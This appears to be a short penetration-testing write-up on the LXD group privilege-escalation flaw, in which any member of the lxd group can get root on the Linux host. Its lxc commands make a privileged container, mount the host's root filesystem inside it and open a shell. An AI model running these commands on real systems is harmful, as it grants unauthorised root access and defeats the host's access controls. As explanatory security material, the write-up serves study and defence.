LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

We must now set the security.privileged flag to true, so that the container has all of the privileges that the root file system has. We will also mount the root file system on the container in the /mnt folder.


```
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```
lxc start privesc

lxc exec privesc /bin/sh
```
